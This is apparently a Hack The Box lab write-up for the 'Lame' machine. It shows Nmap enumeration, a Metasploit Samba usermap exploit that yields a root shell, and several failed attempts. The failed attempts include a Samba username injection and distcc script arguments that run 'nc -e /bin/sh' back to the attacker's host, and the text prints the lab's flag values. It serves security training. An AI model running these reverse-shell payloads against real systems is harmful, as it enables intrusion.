---
title: "Lame"
date: 2023-03-05
# weight: 1
author: MP
hideSummary: true
cover:
    image: "/write-ups/hackthebox/htb_lame/cover.jpg" # image path/url
    relative: true # when using page bundles set this to true
    hidden: false # only hide on current single page
---

---

## Enumeration
1. Started with an Nmap scan `nmap -sC -sV -Pn -oA nmap/full 10.10.10.3`
	1. `-sC` Scan with default NSE scripts. Considered useful for discovery and safe.
	2. `-sV` Attempts to determine the version of the service running on port.
	3. `-Pn` Ping probes were being blocked.
	4. `-oA nmap/full` Outputs all format results to a file named full in the nmap directory.

![](/write-ups/hackthebox/htb_lame/lame_01.png)

---

### VSFTPD

**CVE-2011-2523**

Starting with VSFTPD, I searched exploit-db for `vsftpd 2.3.4` and found the following backdoor command execution exploits: https://www.exploit-db.com/exploits/49757 & https://www.exploit-db.com/exploits/17491

The first link is to a Python3 file and the second link is to a Metasploit file; both files perform CVE-2011-2523.

---

### SMB

**CVE-2007-2447**

Next, I searched for exploit-db for `samba 3.0.20` and found a Metasploit exploit for CVE-2007-2447: https://www.exploit-db.com/exploits/16320

---

## Exploitation + Root
**SMB CVE-2007-2447 Using Metasploit**

I launched Metasploit using `msfconsole` and searched for Samba 3.0.20: 

`search samba 3.0.20`

![](/write-ups/hackthebox/htb_lame/lame_02.png)

Looking at the options for the exploit, I provided the target host address (RHOST), listen address (LHOST):

`show options`

`set rhost 10.10.10.3`

`set lhost 10.10.14.6`

![](/write-ups/hackthebox/htb_lame/lame_03.png)

After filling in the options, I ran the exploit and received a reverse shell as root:

`run`

`whoami`

![](/write-ups/hackthebox/htb_lame/lame_04.png)

After confirming I was root, I obtained both the user and root flags:

`cat /home/makis/user.txt` > `d1bd3634d0056ea44f390e8b8c81a1e3`

`cat /root/root.txt` > `d2a473c2dcb76bb90cf02a8d646564ed`

![](/write-ups/hackthebox/htb_lame/lame_05.png)

![](/write-ups/hackthebox/htb_lame/lame_05-2.png)

---

### Failed Exploit 1

**VSFTPD - CVE-2011-2523 Python Script**

I downloaded the Python file for CVE-2011-2523 from: https://www.exploit-db.com/exploits/49757
Trying to run the file I received a connection refused error

`python3 ./49757.py 10.10.10.3`

![](/write-ups/hackthebox/htb_lame/lame_06.png)

---

### Failed Exploit 2

**VSFTPD - CVE-2011-2523 Metasploit Script**

I launched Metasploit using `msfconsole` and located the exploit:

`search vsftpd 2.3.4`

`use 0`

Setting the target host address (RHOST) with `set rhost 10.10.10.3` and entering `run` returned a prompt to specify a password.

![](/write-ups/hackthebox/htb_lame/lame_07.png)

---

### Failed Exploit 3

**SMB CVE-2007-2447 Python Script**

I downloaded the exploit from the following address: https://github.com/amriunix/CVE-2007-2447

Next, I installed the dependent packages with pipx: `pipx install --include-deps pysmb`

I launched a Netcat listener on port 1234: `nc -lvnp 1234`

Finally, I tried running the exploit supplying the target address, target port, listener address, and listener port:

`python3 ./usermap_script.py 10.10.10.3 139 10.10.14.6 1234`

![](/write-ups/hackthebox/htb_lame/lame_08.png)

Looking into this error it turns out `pipx` is limited to Python3 packages: https://stackoverflow.com/questions/65974803/python2-7-no-smb-module-cant-locate

---

### Failed Exploit 4

**SMB Manually**

I tried the manual exploit from 0xdf's write-up: https://0xdf.gitlab.io/2020/04/07/htb-lame.html#completely-manually

Running the following I received a connection refused error:

`smbclient //10.10.10.3/tmp -U "./=`nohup nc -e /bin/sh 10.10.14.6 1234`"`


![](/write-ups/hackthebox/htb_lame/lame_09.png)

---

### Failed Exploit 5

**Distcc with Nmap**

I confirmed the Distcc script was installed with Nmap: `locate *.nse | grep distcc`

![](/write-ups/hackthebox/htb_lame/lame_10.png)

Next, I tried to run a remote command using the script I just located: `nmap -Pn -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'"`

I also tried to run a remote command to provide a reverse shell with Netcat but the connection was filtered: `nmap -Pn -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh 10.10.14.6 443'"`

![](/write-ups/hackthebox/htb_lame/lame_11.png)
